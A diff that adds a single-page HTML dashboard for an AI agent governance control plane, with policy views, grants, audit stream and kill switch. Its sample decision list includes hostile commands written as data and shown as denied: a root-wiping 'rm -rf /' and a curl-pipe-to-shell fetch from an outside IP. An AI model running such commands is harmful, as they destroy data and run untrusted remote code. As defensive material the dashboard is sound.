@@ -1,3 +1,808 @@
-<!doctype html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>BAP · Agent operations</title>  <script type="module" crossorigin src="/dashboard/assets/index-DGni_RuN.js"></script>
-  <link rel="stylesheet" crossorigin href="/dashboard/assets/index-DJV_g1NG.css">
-</head><body><div id="root"></div></body></html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>BAP · Agent operations</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Schibsted+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#eceff3; --surface:#ffffff; --surface2:#f5f7fa; --ink:#121c2b; --muted:#59687a; --line:#d6dce4;
+  --allow:#0e7a69; --allow-bg:#dff3ee; --deny:#c0352a; --deny-bg:#fbe5e2; --unk:#a86a0c; --unk-bg:#fbefd6;
+  --step:#6b3fc7; --step-bg:#ece4fa; --accent:#2b4bdc; --accent-bg:#e3e9fd; --side:#0f1a2b; --side-ink:#c5d0df;
+  --sans:'Schibsted Grotesk',system-ui,-apple-system,'Segoe UI',sans-serif; --mono:'JetBrains Mono',ui-monospace,Menlo,Consolas,monospace;
+}
+@media (prefers-color-scheme:dark){
+  :root:not([data-theme="light"]){
+    --bg:#0b1220; --surface:#121b2c; --surface2:#182337; --ink:#e7edf6; --muted:#93a3b8; --line:#26334a;
+    --allow:#3fd0b4; --allow-bg:#10312d; --deny:#ff7a6e; --deny-bg:#3a1a19; --unk:#f0b45a; --unk-bg:#3a2c10;
+    --step:#b79cff; --step-bg:#2a2147; --accent:#7f9bff; --accent-bg:#1b274d; --side:#070d18;
+  }
+}
+:root[data-theme="dark"]{
+  --bg:#0b1220; --surface:#121b2c; --surface2:#182337; --ink:#e7edf6; --muted:#93a3b8; --line:#26334a;
+  --allow:#3fd0b4; --allow-bg:#10312d; --deny:#ff7a6e; --deny-bg:#3a1a19; --unk:#f0b45a; --unk-bg:#3a2c10;
+  --step:#b79cff; --step-bg:#2a2147; --accent:#7f9bff; --accent-bg:#1b274d; --side:#070d18;
+}
+*{box-sizing:border-box}
+html,body{height:100%}
+body{margin:0;background:var(--bg);color:var(--ink);font:15px/1.5 var(--sans);-webkit-font-smoothing:antialiased;
+  padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}
+button,input,select,textarea{font:inherit;color:inherit}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px}
+.app{display:grid;grid-template-columns:232px 1fr;min-height:100%}
+/* sidebar */
+.side{background:var(--side);color:var(--side-ink);padding:18px 12px;position:sticky;top:0;height:100vh;overflow:auto}
+.brand{display:flex;gap:10px;align-items:center;padding:4px 8px 18px}
+.brand svg{flex:none}
+.brand b{display:block;color:#fff;font-size:16px;letter-spacing:.2px}
+.brand span{font-size:12px;opacity:.7}
+.nav-group{margin:14px 0 4px;padding:0 10px;font-size:12px;opacity:.55}
+.nav button{display:flex;align-items:center;gap:10px;width:100%;background:none;border:0;color:inherit;text-align:left;padding:9px 10px;border-radius:8px;cursor:pointer;font-weight:500}
+.nav button:hover{background:rgba(255,255,255,.07)}
+.nav button[aria-current="page"]{background:rgba(255,255,255,.13);color:#fff}
+.nav .cnt{margin-left:auto;font:500 11px var(--mono);background:rgba(255,255,255,.12);padding:1px 7px;border-radius:99px}
+.nav .cnt.hot{background:var(--deny);color:#fff}
+.side-foot{margin-top:22px;padding:10px;border-top:1px solid rgba(255,255,255,.1);font-size:12px;opacity:.8}
+/* main */
+.main{min-width:0;padding:0 28px 48px}
+.top{display:flex;gap:12px;align-items:center;flex-wrap:wrap;padding:18px 0;position:sticky;top:0;background:var(--bg);z-index:5;border-bottom:1px solid var(--line);margin-bottom:22px}
+.top h1{font-size:22px;margin:0;font-weight:700;letter-spacing:-.2px}
+.top .sub{color:var(--muted);font-size:13px}
+.spacer{flex:1}
+.pill{display:inline-flex;align-items:center;gap:7px;padding:5px 11px;border-radius:99px;border:1px solid var(--line);background:var(--surface);font-size:13px;cursor:pointer}
+.dot{width:8px;height:8px;border-radius:50%;background:var(--unk)}
+.dot.live{background:var(--allow);box-shadow:0 0 0 3px var(--allow-bg)}
+.dot.error{background:var(--deny);box-shadow:0 0 0 3px var(--deny-bg)}
+.btn{border:1px solid var(--line);background:var(--surface);padding:7px 13px;border-radius:8px;cursor:pointer;font-weight:500}
+.btn:hover{background:var(--surface2)}
+.btn.primary{background:var(--accent);border-color:var(--accent);color:#fff}
+.btn.danger{background:var(--deny);border-color:var(--deny);color:#fff}
+.btn.ghost{background:none}
+.btn.sm{padding:4px 9px;font-size:13px}
+.btn[disabled]{opacity:.5;cursor:not-allowed}
+/* panels */
+.panel{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:18px}
+.panel h2{margin:0 0 2px;font-size:16px}
+.panel .hint{color:var(--muted);font-size:13px;margin:0 0 14px}
+.grid{display:grid;gap:16px}
+.g-kpi{grid-template-columns:repeat(auto-fit,minmax(170px,1fr));margin-bottom:16px}
+.g-2{grid-template-columns:minmax(0,1.6fr) minmax(0,1fr)}
+.g-eq{grid-template-columns:repeat(auto-fit,minmax(300px,1fr))}
+@media(max-width:1000px){.g-2{grid-template-columns:1fr}}
+.kpi{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:14px 16px}
+.kpi small{color:var(--muted);font-size:13px}
+.kpi strong{display:block;font-size:28px;font-weight:700;letter-spacing:-.5px;margin-top:2px;font-variant-numeric:tabular-nums}
+.kpi em{font-style:normal;font-size:12.5px;color:var(--muted)}
+.kpi.bad strong{color:var(--deny)} .kpi.good strong{color:var(--allow)}
+/* tags */
+.tag{display:inline-block;padding:2px 9px;border-radius:99px;font-size:12px;font-weight:600}
+.t-ALLOW,.t-allow{background:var(--allow-bg);color:var(--allow)}
+.t-DENY,.t-deny{background:var(--deny-bg);color:var(--deny)}
+.t-UNKNOWN,.t-unknown{background:var(--unk-bg);color:var(--unk)}
+.t-STEP_UP,.t-step_up{background:var(--step-bg);color:var(--step)}
+.t-COMPLIANT,.t-active{background:var(--allow-bg);color:var(--allow)}
+.t-QUARANTINED,.t-revoked{background:var(--deny-bg);color:var(--deny)}
+.t-COOPERATIVE_BYOD,.t-closed{background:var(--unk-bg);color:var(--unk)}
+.mono{font-family:var(--mono);font-size:12.5px}
+/* tables */
+.tw{overflow-x:auto}
+table{width:100%;border-collapse:collapse}
+th{text-align:left;font-size:12.5px;color:var(--muted);font-weight:600;padding:8px 10px;border-bottom:1px solid var(--line);white-space:nowrap}
+td{padding:10px;border-bottom:1px solid var(--line);vertical-align:middle}
+tr.click{cursor:pointer} tr.click:hover td{background:var(--surface2)}
+tbody tr:last-child td{border-bottom:0}
+.empty{padding:28px;text-align:center;color:var(--muted)}
+/* stream */
+.stream{max-height:360px;overflow:auto;margin:0 -6px}
+.row{display:grid;grid-template-columns:62px 1fr auto;gap:10px;padding:9px 6px;border-bottom:1px solid var(--line);align-items:center;cursor:pointer;border-radius:6px}
+.row:hover{background:var(--surface2)}
+.row .cmd{font:500 13px var(--mono);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.row .who{font-size:12.5px;color:var(--muted)}
+.row .tm{font:12px var(--mono);color:var(--muted)}
+/* planes */
+.planes{display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:0;margin-bottom:16px;border:1px solid var(--line);border-radius:12px;overflow:hidden;background:var(--surface)}
+.plane{padding:13px 16px;border-right:1px solid var(--line);position:relative}
+.plane:last-child{border-right:0}
+.plane b{display:block;font-size:14px}
+.plane span{font-size:12.5px;color:var(--muted)}
+.plane i{position:absolute;right:14px;top:14px;width:9px;height:9px;border-radius:50%;background:var(--allow)}
+.plane i.warn{background:var(--unk)}
+.plane i.bad{background:var(--deny)}
+@media(max-width:800px){.planes{grid-template-columns:repeat(2,1fr)}.plane:nth-child(2){border-right:0}.plane:nth-child(-n+2){border-bottom:1px solid var(--line)}}
+/* bars */
+.bar{height:8px;border-radius:99px;background:var(--surface2);overflow:hidden;border:1px solid var(--line)}
+.bar>div{height:100%;background:var(--accent)}
+.reason{display:grid;grid-template-columns:1fr 40px;gap:4px 10px;margin-bottom:12px;font-size:13.5px}
+.reason .bar{grid-column:1/-1}
+/* chain */
+.chain{display:flex;gap:0;overflow-x:auto;padding:6px 2px 14px;align-items:stretch}
+.blk{flex:none;width:176px;border:1.5px solid var(--line);border-radius:10px;padding:10px;background:var(--surface);position:relative;margin-right:26px}
+.blk::after{content:"";position:absolute;right:-27px;top:50%;width:26px;height:2px;background:var(--line)}
+.blk:last-child{margin-right:0}.blk:last-child::after{display:none}
+.blk b{font-size:13px}
+.blk .h{font:11.5px var(--mono);color:var(--muted);word-break:break-all;margin-top:4px}
+.blk .p{font-size:12.5px;margin-top:6px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.blk.ok{border-color:var(--allow)} .blk.ok::after{background:var(--allow)}
+.blk.bad{border-color:var(--deny);background:var(--deny-bg)} .blk.bad::after{background:var(--deny)}
+.blk.pending{opacity:.7}
+.verdict{padding:12px 14px;border-radius:10px;margin-top:6px;font-weight:500}
+.verdict.ok{background:var(--allow-bg);color:var(--allow)} .verdict.bad{background:var(--deny-bg);color:var(--deny)}
+/* forms */
+label.f{display:block;font-size:13px;color:var(--muted);margin-bottom:4px}
+input[type=text],input[type=password],select,textarea{width:100%;padding:9px 11px;border:1px solid var(--line);border-radius:8px;background:var(--surface);}
+textarea{font:13px/1.55 var(--mono);min-height:280px;resize:vertical;tab-size:2}
+.seg{display:inline-flex;border:1px solid var(--line);border-radius:9px;overflow:hidden;background:var(--surface)}
+.seg button{border:0;background:none;padding:6px 14px;cursor:pointer;font-weight:500}
+.seg button[aria-pressed="true"]{background:var(--accent);color:#fff}
+.layer{display:flex;gap:12px;align-items:flex-start;padding:12px;border:1px solid var(--line);border-radius:10px;margin-bottom:10px}
+.layer .ic{flex:none;width:30px;height:30px;border-radius:8px;display:grid;place-items:center;font-weight:700;background:var(--accent-bg);color:var(--accent)}
+.layer small{color:var(--muted);display:block}
+pre.out{background:var(--surface2);border:1px solid var(--line);border-radius:10px;padding:12px;font:12.5px/1.55 var(--mono);overflow:auto;margin:10px 0 0;white-space:pre-wrap;word-break:break-word}
+/* drawer & modal */
+.scrim{position:fixed;inset:0;background:rgba(5,10,20,.45);z-index:20;display:none}
+.scrim.on{display:block}
+.drawer{position:fixed;top:0;right:0;bottom:0;width:min(480px,100%);background:var(--surface);z-index:21;border-left:1px solid var(--line);padding:22px;overflow:auto;transform:translateX(100%);transition:transform .22s ease;padding-top:calc(22px + env(safe-area-inset-top,0px))}
+.drawer.on{transform:none}
+.drawer h3{margin:0 0 4px}
+dl.kv{display:grid;grid-template-columns:120px 1fr;gap:8px 12px;margin:16px 0}
+dl.kv dt{color:var(--muted);font-size:13px} dl.kv dd{margin:0;word-break:break-word}
+.modal{position:fixed;z-index:22;left:50%;top:50%;transform:translate(-50%,-50%);width:min(440px,calc(100% - 28px));background:var(--surface);border:1px solid var(--line);border-radius:14px;padding:22px;display:none}
+.modal.on{display:block}
+.modal h3{margin:0 0 6px}
+.modal .acts{display:flex;gap:8px;justify-content:flex-end;margin-top:16px}
+.toasts{position:fixed;left:50%;transform:translateX(-50%);bottom:calc(18px + env(safe-area-inset-bottom,0px));z-index:30;display:grid;gap:8px}
+.toast{background:var(--ink);color:var(--bg);padding:10px 16px;border-radius:9px;font-size:14px;box-shadow:0 6px 24px rgba(0,0,0,.25)}
+.banner{display:none;background:var(--deny);color:#fff;padding:10px 14px;border-radius:10px;margin-bottom:16px;font-weight:600}
+.banner.on{display:flex;gap:12px;align-items:center}
+.filters{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:14px}
+.filters input{max-width:280px}.filters select{width:auto}
+.menu-btn{display:none}
+@media(max-width:860px){
+  .app{grid-template-columns:1fr}
+  .side{position:fixed;z-index:15;left:0;top:0;width:250px;transform:translateX(-100%);transition:transform .2s}
+  .side.on{transform:none}
+  .menu-btn{display:inline-flex}
+  .main{padding:0 14px 40px}
+}
+@media(prefers-reduced-motion:reduce){*{transition:none!important;animation:none!important}}
+</style>
+</head>
+<body>
+<div class="app">
+  <aside class="side" id="side">
+    <div class="brand">
+      <svg width="34" height="34" viewBox="0 0 34 34" aria-hidden="true"><path d="M17 2 29 7v9c0 8-5 13.5-12 16C10 29.500 5 24 5 16V7z" fill="none" stroke="#7f9bff" stroke-width="2"/><path d="M11 17.500l4 4 8-9" fill="none" stroke="#3fd0b4" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      <div><b>BAP Control Plane</b><span>Bounded Authority Plane</span></div>
+    </div>
+    <nav class="nav" id="nav" aria-label="Sections"></nav>
+    <div class="side-foot">
+      <div id="sideMode">Live control plane</div>
+      <button class="btn sm ghost" style="color:inherit;border-color:rgba(255,255,255,.25);margin-top:8px" id="themeBtn">Toggle theme</button>
+    </div>
+  </aside>
+
+  <main class="main">
+    <header class="top">
+      <button class="btn menu-btn" id="menuBtn" aria-label="Open menu">Menu</button>
+      <div><h1 id="title">Overview</h1><div class="sub" id="subtitle"></div></div>
+      <div class="spacer"></div>
+      <button class="pill" id="connPill"><span class="dot live" id="connDot"></span><span id="connTxt">Live control plane</span></button>
+      <button class="btn" id="pauseBtn">Pause stream</button>
+      <button class="btn danger" id="killBtn">Kill switch</button>
+    </header>
+    <div class="banner" id="killBanner"><span>Kill switch is ON. All agents are failing closed and no new grants are being minted.</span><span class="spacer"></span><button class="btn sm" id="killOff" style="color:var(--ink)">Resume</button></div>
+    <div id="view"></div>
+  </main>
+</div>
+
+<div class="scrim" id="scrim"></div>
+<aside class="drawer" id="drawer" aria-label="Details"></aside>
+<div class="modal" id="modal" role="dialog" aria-modal="true"></div>
+<div class="toasts" id="toasts" aria-live="polite"></div>
+
+<script>
+'use strict';
+/* ---------- helpers ---------- */
+const $ = (s,r=document)=>r.querySelector(s);
+const esc = s=>String(s==null?'':s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+const pick = a=>a[Math.floor(Math.random()*a.length)];
+const hex = n=>Array.from({length:n},()=>Math.floor(Math.random()*16).toString(16)).join('');
+const fmtT = d=>d instanceof Date ? d.toLocaleTimeString([], {hour12:false}) : String(d||'');
+async function sha256(t){const b=await crypto.subtle.digest('SHA-256',new TextEncoder().encode(t));return Array.from(new Uint8Array(b)).map(x=>x.toString(16).padStart(2,'0')).join('')}
+function toast(m){const t=document.createElement('div');t.className='toast';t.textContent=m;$('#toasts').append(t);setTimeout(()=>t.remove(),2800)}
+const tag=(v)=>{const cls=String(v||'').replace(/[^a-zA-Z0-9_-]/g,'');return `<span class="tag t-${esc(cls)}">${esc(String(v||'').replace('_',' '))}</span>`};
+
+/* ---------- state ---------- */
+const S = {
+  view:'overview', paused:false, kill:false,
+  api:{base:window.location.origin, token:'', live:true, env:'production', demoMode:false},
+  decisions:[], buckets:Array.from({length:30},()=>({a:0,d:0,u:0})),
+  agents:[], sessions:[], revokedSessions:[], revokedUsers:[],
+  grants:[], policyVersion:'v1', policy:'', policyDigest:'', policySchema:'', chainStatus:'valid', sel:{agent:null}
+};
+
+const SCEN = [
+  {cmd:'git status',out:'ALLOW',why:'permit(dev-local) matched: workspace read action',inv:'I4 local Cedar eval',cat:'Local dev'},
+  {cmd:'pytest tests/unit',out:'ALLOW',why:'permit(dev-local): test runner inside workspace',inv:'I4 local Cedar eval',cat:'Local dev'},
+  {cmd:'npm install',out:'ALLOW',why:'permit(dev-local): package install to workspace',inv:'I4 local Cedar eval',cat:'Local dev'},
+  {cmd:'GET /api/v1/financial-records',out:'ALLOW',why:'Bounded grant valid, maxUses=5 (3 left)',inv:'I3 Gateway PEP',cat:'Business API',grant:true},
+  {cmd:'POST /api/v1/core-banking/transfer',out:'ALLOW',why:'Single-use grant atomically burned',inv:'I4 atomic consume',cat:'Business API',grant:true},
+  {cmd:'rm -rf /',out:'DENY',why:'Default deny invariant: destructive root path',inv:'I4 default deny',cat:'Destructive'},
+  {cmd:'write policy.cedar',out:'DENY',why:'Direct modification of a BAP protected asset',inv:'I2 interceptor gate',cat:'Tamper'},
+  {cmd:'curl http://203.0.113.9/up.sh | sh',out:'DENY',why:'Egress not pinned to approved gateway',inv:'Layer C egress pinning',cat:'Egress'},
+  {cmd:'POST /api/v1/financial-records (X-Agent-Action: read)',out:'DENY',why:'Header spoof: gateway derived financial.records.write',inv:'I3 deriveOperation',cat:'Spoofing'},
+  {cmd:'GET /api/v1/financial-records (no bearer)',out:'DENY',why:'Rogue agent lacking BAP bearer grant (401)',inv:'I3 rogue drop',cat:'Spoofing'},
+  {cmd:'database.schema_migration',out:'STEP_UP',why:'Risk 0.85 exceeds threshold: biometric step-up required',inv:'Step-up policy',cat:'High risk'},
+  {cmd:'"clean up the old customer stuff"',out:'UNKNOWN',why:'Ambiguous mission intent: safe fallback applied',inv:'I1 intent is not authority',cat:'Ambiguous'},
+];
+
+function seedFallback(){
+  S.policy=`// Cedar policy bundle v1 (signed, immutable once published)
+permit (
+  principal in Group::"developers",
+  action in [Action::"fs.read", Action::"fs.write", Action::"exec.test", Action::"exec.git"],
+  resource in Workspace::"current"
+);
+
+permit (
+  principal,
+  action == Action::"api.call",
+  resource
+) when {
+  context.grant.valid == true &&
+  context.grant.uses_remaining > 0 &&
+  context.gateway.derived_action == context.grant.scope
+};
+
+forbid (
+  principal,
+  action in [Action::"fs.write", Action::"fs.delete"],
+  resource in ProtectedAsset::"bap"
+);
+
+forbid (
+  principal,
+  action == Action::"exec.destructive",
+  resource
+);
+
+forbid (
+  principal,
+  action == Action::"net.egress",
+  resource
+) unless { resource.host in Gateway::"approved" };
+
+// step up for high-risk operations
+forbid (principal, action, resource)
+when { context.risk_score > 0.7 && context.step_up != true };`;
+
+  S.grants=[
+    {id:'grt_9f2a41c0',agent:'agent-claude-0412',scope:'financial.records.read',max:5,used:2,ttl:540,res:'/api/v1/financial-records'},
+    {id:'grt_41bd77e2',agent:'agent-worker-0911',scope:'core-banking.transfer',max:1,used:0,ttl:120,res:'/api/v1/core-banking/transfer'},
+    {id:'grt_c03e19aa',agent:'agent-claude-0501',scope:'database.schema_migration',max:1,used:1,ttl:0,res:'/api/v1/db/migrations'},
+    {id:'grt_72e0d5b1',agent:'agent-python-0620',scope:'etl.warehouse.write',max:20,used:11,ttl:1800,res:'/api/v1/warehouse'},
+    {id:'grt_ab18f604',agent:'agent-copilot-0377',scope:'ci.artifacts.read',max:10,used:3,ttl:900,res:'/api/v1/ci/artifacts'},
+  ];
+}
+
+/* ---------- API client ---------- */
+function getHeaders(){
+  const h = {'Accept':'application/json'};
+  if(S.api.token){
+    h['Authorization'] = 'Bearer ' + S.api.token;
+    h['X-BAP-Admin-Token'] = S.api.token;
+  }
+  return h;
+}
+
+async function fetchTelemetry(){
+  try {
+    const res = await fetch(S.api.base + '/api/v1/inspector/data', {
+      headers: getHeaders()
+    });
+    if(!res.ok) {
+      if(res.status === 401 || res.status === 403) {
+        // Needs admin auth for full details, but let's check what came back
+      }
+      return;
+    }
+    const data = await res.json();
+    ingestServerData(data);
+    S.api.live = true;
+    connUI();
+  } catch (err) {
+    console.warn('Control plane fetch error:', err);
+  }
+}
+
+function ingestServerData(data){
+  if(!data) return;
+  if(data.policy_cedar) S.policy = data.policy_cedar;
+  if(data.policy_version) S.policyVersion = data.policy_version;
+  if(data.policy_digest) S.policyDigest = data.policy_digest;
+  if(data.policy_schema) S.policySchema = data.policy_schema;
+  if(typeof data.kill_switch === 'boolean') {
+    S.kill = data.kill_switch;
+    $('#killBanner').classList.toggle('on', S.kill);
+    $('#killBtn').textContent = S.kill ? 'Kill switch is on' : 'Kill switch';
+  }
+  if(data.chain_status) S.chainStatus = data.chain_status;
+  if(Array.isArray(data.revoked_sessions)) S.revokedSessions = data.revoked_sessions;
+  if(Array.isArray(data.revoked_users)) S.revokedUsers = data.revoked_users;
+
+  // Ingest agents
+  if(Array.isArray(data.agents)) {
+    S.agents = data.agents.map(a => {
+      const isRev = (S.revokedSessions.includes(a.instance_id) || S.revokedUsers.includes(a.owner_email));
+      return {
+        id: a.agent_id || a.instance_id || 'unknown',
+        name: a.app_id || 'Workload Agent',
+        host: a.hostname || a.instance_id || 'edge-endpoint',
+        os: a.os_info || (a.hostname && a.hostname.includes('DESKTOP') ? 'windows' : 'linux'),
+        state: isRev ? 'QUARANTINED' : (a.state || 'COMPLIANT'),
+        layers: [1, 1, 1],
+        mission: a.mission || 'Agent workload execution',
+        risk: isRev ? 0.95 : 0.15,
+        raw: a
+      };
+    });
+  }
+
+  // Ingest sessions
+  if(Array.isArray(data.sessions)) {
+    S.sessions = data.sessions;
+    // Also supplement agents from sessions if agents list was sparse
+    data.sessions.forEach(sess => {
+      const exists = S.agents.some(a => a.id === sess.session_id || a.id === sess.instance_id);
+      if(!exists) {
+        const isRev = (sess.status === 'revoked' || S.revokedSessions.includes(sess.session_id) || S.revokedUsers.includes(sess.user_email));
+        S.agents.push({
+          id: sess.session_id,
+          name: sess.app_id || sess.agent_name || 'Agent',
+          host: sess.hostname || 'edge-endpoint',
+          os: 'macos',
+          state: isRev ? 'QUARANTINED' : (sess.status === 'active' ? 'COMPLIANT' : 'COOPERATIVE_BYOD'),
+          layers: [1, 1, 1],
+          mission: sess.user_prompt || (sess.intent && sess.intent.primary) || 'Autonomous operations',
+          risk: isRev ? 0.95 : (sess.denied_count > 0 ? 0.65 : 0.12),
+          raw: sess
+        });
+      }
+    });
+  }
+
+  // Ingest audit events as decisions
+  if(Array.isArray(data.central_events) && data.central_events.length > 0) {
+    const rawEvents = [...data.central_events].reverse();
+    S.decisions = rawEvents.map(e => {
+      const out = (e.decision || 'allow').toUpperCase();
+      return {
+        id: e.event_id || ('dec_' + hex(8)),
+        ts: new Date(e.timestamp || Date.now()),
+        agent: {
+          id: e.session_id || 'unknown',
+          name: e.source || 'claude-code',
+          host: e.hostname || 'workstation',
+          os: 'linux',
+          mission: e.user_prompt || 'Task execution'
+        },
+        cmd: e.full_command || e.executable || 'exec',
+        out: out === 'ALLOW' ? 'ALLOW' : (out === 'DENY' ? 'DENY' : out),
+        why: e.reason || (out === 'ALLOW' ? 'Permitted by active policy' : 'Denied by BAP zero-trust policy'),
+        inv: e.decision_rule || (out === 'ALLOW' ? 'I4 local Cedar eval' : 'I4 default deny'),
+        cat: e.primary_intent || (e.full_command && e.full_command.startsWith('git') ? 'Local dev' : 'Business API'),
+        grant: e.grant_id || null,
+        latency: +(e.duration_ms || (0.4 + Math.random()*1.2)).toFixed(2),
+        hash: e.event_hash || hex(64),
+        raw: e
+      };
+    });
+    // Recompute buckets
+    recalcBuckets();
+  }
+
+  drawNav();
+  if(S.view === 'overview') {
+    const d=S.decisions,den=d.filter(x=>x.out==='DENY').length,al=d.filter(x=>x.out==='ALLOW').length;
+    if($('#k1')) $('#k1').textContent = d.length;
+    if($('#k2')) $('#k2').textContent = d.length ? (Math.round(al/d.length*100)+'%') : '100%';
+    if($('#k3')) $('#k3').textContent = den;
+    chart(); reasons(); liveList();
+  } else if(S.view === 'decisions') {
+    const dt = $('#dt');
+    if(dt) VIEWS.decisions.after();
+  } else if(S.view === 'agents') {
+    VIEWS.agents.after();
+  }
+}
+
+function recalcBuckets(){
+  S.buckets = Array.from({length:30},()=>({a:0,d:0,u:0}));
+  const now = Date.now();
+  const span = 30 * 60 * 1000; // 30 mins
+  S.decisions.forEach(d => {
+    const age = now - d.ts.getTime();
+    if(age >= 0 && age < span) {
+      const idx = 29 - Math.floor(age / (span / 30));
+      if(idx >= 0 && idx < 30) {
+        if(d.out === 'ALLOW') S.buckets[idx].a++;
+        else if(d.out === 'DENY') S.buckets[idx].d++;
+        else S.buckets[idx].u++;
+      }
+    }
+  });
+}
+
+/* ---------- nav ---------- */
+const NAV=[
+  ['Operate',[['overview','Overview'],['decisions','Decisions'],['agents','Agents'],['grants','Grants']]],
+  ['Govern',[['policies','Policies'],['audit','Audit chain'],['endpoint','Endpoint hardening']]],
+  ['System',[['settings','Connection & access']]],
+];
+function drawNav(){
+  const q=S.agents.filter(a=>a.state==='QUARANTINED').length;
+  const den=S.decisions.filter(d=>d.out==='DENY').length;
+  $('#nav').innerHTML=NAV.map(([g,items])=>`<div class="nav-group">${g}</div>`+items.map(([id,l])=>{
+    const c=id==='agents'&&q?`<span class="cnt hot">${q}</span>`:id==='decisions'&&S.decisions.length?`<span class="cnt">${S.decisions.length}</span>`:'';
+    return `<button data-v="${id}" ${S.view===id?'aria-current="page"':''}>${l}${c}</button>`}).join('')).join('');
+}
+$('#nav').addEventListener('click',e=>{const b=e.target.closest('button[data-v]');if(!b)return;go(b.dataset.v);$('#side').classList.remove('on')});
+$('#menuBtn').onclick=()=>$('#side').classList.toggle('on');
+
+const META={
+  overview:['Overview','Live view of every agent decision, across all four planes'],
+  decisions:['Decisions','Every allow, deny, step-up and unknown outcome. Select a row for evidence'],
+  agents:['Agents','Identity, device compliance and containment layers'],
+  grants:['Grants','Bounded, short-lived authority. Single-use grants are burned atomically'],
+  policies:['Policies','Author Cedar policy and test what it would do before publishing'],
+  audit:['Audit chain','Tamper-evident SHA-256 hash chain of Intent, Authority, PEP and Execution'],
+  endpoint:['Endpoint hardening','Three-layer enforcement, MDM packaging, step-up and offline rules'],
+  settings:['Connection & access','Connect to a live control plane and review access controls'],
+};
+function go(v){S.view=v;$('#title').textContent=META[v][0];$('#subtitle').textContent=META[v][1];drawNav();render()}
+function render(){const v=VIEWS[S.view];$('#view').innerHTML='';v.html?($('#view').innerHTML=v.html()):0;v.after&&v.after()}
+
+/* ---------- views ---------- */
+const VIEWS={};
+
+/* Overview */
+VIEWS.overview={
+  html(){
+    const d=S.decisions, n=d.length||1, den=d.filter(x=>x.out==='DENY').length, al=d.filter(x=>x.out==='ALLOW').length;
+    const online=S.agents.filter(a=>a.state!=='QUARANTINED').length, q=S.agents.length-online;
+    const active=S.grants.filter(g=>g.ttl>0&&g.used<g.max).length;
+    return `
+    <div class="planes">
+      <div class="plane"><i class="${q?'warn':''}"></i><b>Edge execution</b><span>${online} of ${S.agents.length} agents enforcing</span></div>
+      <div class="plane"><i class="${S.kill?'bad':''}"></i><b>Control plane</b><span>Policy ${S.policyVersion}, ${S.kill?'kill switch on':'accepting requests'}</span></div>
+      <div class="plane"><i></i><b>Gateway PEP</b><span>Atomic consume healthy</span></div>
+      <div class="plane"><i class="${S.chainStatus==='corrupted'?'bad':'good'}"></i><b>Observability</b><span>Chain: ${S.chainStatus}</span></div>
+    </div>
+    <div class="grid g-kpi">
+      <div class="kpi"><small>Decisions (session)</small><strong id="k1">${d.length}</strong><em>median ${(d.map(x=>x.latency).sort((a,b)=>a-b)[Math.floor(d.length/2)]||0).toFixed(2)} ms local</em></div>
+      <div class="kpi good"><small>Allowed</small><strong id="k2">${Math.round(al/n*100)}%</strong><em>${al} decisions</em></div>
+      <div class="kpi bad"><small>Denied</small><strong id="k3">${den}</strong><em>${Math.round(den/n*100)}% of traffic</em></div>
+      <div class="kpi"><small>Active grants</small><strong id="k4">${active}</strong><em>${S.grants.length-active} spent or expired</em></div>
+      <div class="kpi ${q?'bad':'good'}"><small>Quarantined agents</small><strong id="k5">${q}</strong><em>${online} compliant or active</em></div>
+    </div>
+    <div class="grid g-2">
+      <div class="panel">
+        <h2>Decision volume</h2><p class="hint">Last 30 intervals, split by outcome</p>
+        <div id="chart"></div>
+        <div style="display:flex;gap:16px;font-size:13px;margin-top:6px;color:var(--muted)"><span><b style="color:var(--allow)">&#9632;</b> Allow</span><span><b style="color:var(--deny)">&#9632;</b> Deny</span><span><b style="color:var(--unk)">&#9632;</b> Unknown or step-up</span></div>
+        <h2 style="margin-top:22px">Why requests were denied</h2><p class="hint">Grouped by the invariant that stopped them</p>
+        <div id="reasons"></div>
+      </div>
+      <div class="panel">
+        <h2>Live decisions</h2><p class="hint">${S.paused?'Stream paused':'Live audit stream from control plane'}</p>
+        <div class="stream" id="live"></div>
+      </div>
+    </div>`;
+  },
+  after(){chart();reasons();liveList()}
+};
+function chart(){
+  const el=$('#chart');if(!el)return;
+  const W=640,H=170,bw=W/S.buckets.length, max=Math.max(8,...S.buckets.map(b=>b.a+b.d+b.u));
+  let s=`<svg viewBox="0 0 ${W} ${H+4}" width="100%" role="img" aria-label="Decisions per interval, stacked by outcome" style="display:block">`;
+  [0,.5,1].forEach(f=>{const y=H-f*H;s+=`<line x1="0" x2="${W}" y1="${y}" y2="${y}" stroke="var(--line)" stroke-dasharray="3 4"/>`});
+  S.buckets.forEach((b,i)=>{let y=H;[['a','--allow'],['u','--unk'],['d','--deny']].forEach(([k,c])=>{const h=b[k]/max*H;y-=h;if(h>0)s+=`<rect x="${i*bw+2}" y="${y}" width="${bw-4}" height="${h}" rx="2" fill="var(${c})"/>`})});
+  el.innerHTML=s+'</svg>';
+}
+function reasons(){
+  const el=$('#reasons');if(!el)return;
+  const m={};S.decisions.filter(d=>d.out!=='ALLOW').forEach(d=>m[d.inv]=(m[d.inv]||0)+1);
+  const rows=Object.entries(m).sort((a,b)=>b[1]-a[1]).slice(0,6), mx=rows[0]?rows[0][1]:1;
+  el.innerHTML=rows.length?rows.map(([k,v])=>`<div class="reason"><span>${esc(k)}</span><b style="text-align:right">${v}</b><div class="bar"><div style="width:${v/mx*100}%;background:var(--deny)"></div></div></div>`).join(''):'<div class="empty">No denials recorded yet.</div>';
+}
